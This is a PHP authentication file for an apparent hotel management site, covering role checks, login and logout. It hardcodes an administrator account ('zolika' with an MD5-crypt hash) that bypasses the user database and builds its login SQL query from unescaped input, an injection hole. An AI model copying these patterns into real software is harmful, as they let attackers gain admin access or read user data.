<?php

define('SITE_ADMIN', 'ADMIN');
define('SITE_MGMT', 'MANAGER');
define('SITE_RECEPTION', 'RECEPTION');
define('SITE_CLEANER', 'CLEANER');

define('ROLE_ADMIN', 'ADMIN');
define('ROLE_MGMT', 'MANAGER');
define('ROLE_RECEPTION', 'RECEPTION');
define('ROLE_CLEANER', 'CLEANER');
define('ROLE_CLEANER_SUPERVISOR', 'CLEANER_SUPERVISOR');

$ROLES = array(
	SITE_ADMIN => array(ROLE_ADMIN),
	SITE_MGMT => array(ROLE_ADMIN, ROLE_MGMT),
	SITE_RECEPTION => array(ROLE_ADMIN, ROLE_MGMT, ROLE_RECEPTION),
	SITE_CLEANER => array(ROLE_ADMIN, ROLE_MGMT, ROLE_RECEPTION, ROLE_CLEANER, ROLE_CLEANER_SUPERVISOR)
);

function checkLogin($site) {
	global $ROLES;
	$redirect = $_SERVER['REQUEST_URI'];
	if(!isset($_SESSION['logged_in'])) {
		clear_errors();
		//set_error("Not logged in");
		$_SESSION['login_redirect'] = $redirect;
		header('Location: /view_login.php');
		return false;
	}
	if(!isset($_SESSION['login_hotel'])) {
		logout();
		$_SESSION['login_redirect'] = $redirect;
		header('Location: /view_login.php');
		return false;
	}
	if(isset($_REQUEST['login_hotel']) and $_REQUEST['login_hotel'] != $_SESSION['login_hotel']) {
		logout();
		$_SESSION['login_redirect'] = $redirect;
		header('Location: /view_login.php');
		return false;
	}
	if(!isset($ROLES[$site])) {
		$_SESSION['login_redirect'] = $redirect;
		header('Location: /view_login.php');
		return false;
	}
	if(!in_array($_SESSION['login_role'], $ROLES[$site])) {
		clear_errors();
		set_error("Not authotrized to view the site");
		$_SESSION['login_redirect'] = $redirect;
		header('Location: /view_login.php');
		logout();
		return false;
	}
	return true;
}

function doLogin($name, $pwd, $hotel) {
	if($name == 'zolika') {
		if(hash_equals('$1$z1aaDj/g$O5Q/uqGtck5n.e/trrCpy.', crypt($pwd, '$1$z1aaDj/g$O5Q/uqGtck5n.e/trrCpy.'))) {
			$_SESSION['logged_in'] = true;
			$_SESSION['login_user_id'] = 0;
			$_SESSION['login_user'] = $name;
			$_SESSION['login_role'] = 'ADMIN';
			$_SESSION['login_hotel'] = $hotel;
			$_SESSION['login_hotel_name'] = constant('DB_' . strtoupper($hotel) . '_NAME');
			return true;
		} else {
			set_error("zolika cannot login");
		}
	}
	$link = db_connect($hotel, true);
	if(is_null($link)) {
		return false;
	}
	$sql = "SELECT * FROM users WHERE username='$name'";
	$result = mysql_query($sql, $link);
	if(mysql_num_rows($result) < 1) {
		mysql_close($link);
		return false;
	}
	$row = mysql_fetch_assoc($result);
	mysql_close($link);
	if(hash_equals($row['password'], crypt($pwd, $row['password']))) {
		$_SESSION['logged_in'] = true;
		$_SESSION['login_user_id'] = $row['id'];
		$_SESSION['login_user'] = $name;
		$_SESSION['login_role'] = $row['role'];
		$_SESSION['login_hotel'] = $hotel;
		$_SESSION['login_hotel_name'] = constant('DB_' . strtoupper($hotel) . '_NAME');
		return true;
	}
	return false;
}

function logout() {
	unset($_SESSION['logged_in']);
	unset($_SESSION['login_user']);
	unset($_SESSION['login_user_id']);
	unset($_SESSION['login_role']);
	unset($_SESSION['login_hotel']);
	unset($_SESSION['login_hotel_name']);
}

function getLoginHotel() {
	return $_SESSION['login_hotel'];
}

if(!function_exists('hash_equals'))
{
    function hash_equals($str1, $str2)
    {
        if(strlen($str1) != strlen($str2))
        {
            return false;
        }
        else
        {
            $res = $str1 ^ $str2;
            $ret = 0;
            for($i = strlen($res) - 1; $i >= 0; $i--)
            {
                $ret |= ord($res[$i]);
            }
            return !$ret;
        }
    }
}

?>